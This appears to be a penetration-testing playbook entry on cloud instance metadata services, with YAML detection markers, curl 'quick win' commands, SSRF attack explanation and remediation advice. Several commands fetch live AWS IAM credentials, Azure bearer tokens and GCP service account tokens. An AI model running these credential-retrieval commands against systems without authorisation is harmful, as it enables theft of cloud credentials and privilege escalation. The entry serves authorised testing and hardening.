---
id: cloud_imds
technology: "Cloud IMDS (AWS/Azure/GCP)"
domain: IT
safety_class: intrusive
severity: critical
life_safety: false
match:
  ports: []
  banners:
    - "169.254.169.254"
    - "metadata.google.internal"
    - "metadata.azure.com"
  markers:
    - "/latest/meta-data/"
    - "/computeMetadata/v1/"
    - "/metadata/instance"
    - "Metadata-Flavor: Google"
    - "X-aws-ec2-metadata-token"
    - "/metadata/identity/oauth2/token"
quick_wins:
  - cmd: "curl -s http://169.254.169.254/latest/meta-data/ --connect-timeout 3"
    safety: safe
    note: "Read-only probe of AWS IMDS root on {host}; confirms reachability without fetching credentials"
  - cmd: "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' --connect-timeout 3"
    safety: safe
    note: "Azure IMDS instance document on {host} — identity and subscription info, no credentials"
  - cmd: "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/' --connect-timeout 3"
    safety: safe
    note: "GCP IMDS instance metadata root enumeration on {host} (read-only)"
  - cmd: "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    safety: intrusive
    note: "AWS IMDSv2 on {host} — obtain session token then retrieve attached IAM role name (no creds yet)"
  - cmd: "ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
    safety: intrusive
    note: "AWS IMDSv1 on {host} — retrieve live temporary IAM credentials (AccessKeyId/Secret/Token); treat as live creds"
  - cmd: "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/' --connect-timeout 3"
    safety: intrusive
    note: "Azure Managed Identity on {host} — fetch live OAuth2 bearer token bound to instance identity"
  - cmd: "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'"
    safety: intrusive
    note: "GCP on {host} — retrieve live service account access token; scope enumeration with gcloud/API calls only"
references:
  - "CVE-2019-11043"
  - "CVE-2021-21985"
  - "CISA KEV CVE-2021-26084"
  - "CWE-918"
mitre: "T1552.005"
---
# Cloud IMDS (Instance Metadata Service) guidance

The Instance Metadata Service (IMDS) is a link-local HTTP endpoint at 169.254.169.254 (all major
clouds) that provides running compute instances with identity, configuration, and temporary IAM
credentials. AWS IMDSv1 is unauthenticated and reachable by any process or web application on the
instance; IMDSv2 requires a session token obtained via a PUT request, providing a limited SSRF
mitigation. Azure IMDS requires the header `Metadata: true` and GCP requires
`Metadata-Flavor: Google`. All three providers expose temporary cloud credentials — AWS
AssumeRole/STS tokens, Azure Managed Identity OAuth2 tokens, and GCP service account access tokens
— that carry whatever IAM permissions are attached to the instance or pod identity.

The primary attack vector in authorized pentests is Server-Side Request Forgery (SSRF): a
vulnerable web application on the instance is abused to pivot and fetch
`http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (AWS), the Azure token
endpoint, or the GCP service account token endpoint. Exfiltrated credentials can then be used
directly against cloud APIs (AWS CLI, az CLI, gcloud) to enumerate permissions and potentially
escalate privilege across the entire cloud environment. Kubernetes pods running on cloud nodes may
inherit node instance credentials or use projected service account tokens via the token volume
projection path, compounding the blast radius significantly.

For safe base enumeration, confirm IMDS reachability from the target system using a read-only curl
to the instance identity document — this does not retrieve credentials. Intrusive steps involve
fetching the IAM role name and then the credential payload; treat any resulting
AccessKeyId/SecretAccessKey/SessionToken, Azure bearer token, or GCP access token as live
credentials and scope their use strictly to enumeration (e.g., `aws sts get-caller-identity`,
`az account show`, `gcloud auth print-access-token`) unless the engagement explicitly authorises
lateral movement. Never persist or exfiltrate credentials outside the controlled test environment.

Remediation: enforce IMDSv2-only on AWS (`http-tokens: required` in instance metadata options),
disable IMDS entirely if the instance does not require it, restrict outbound SSRF via egress
firewall rules and WAF policies blocking requests to 169.254.169.254, apply least-privilege IAM
roles to instance profiles and managed identities, and monitor CloudTrail, Azure Monitor, and GCP
Cloud Audit Logs for unexpected metadata API calls or credential use from anomalous source IPs or
regions.
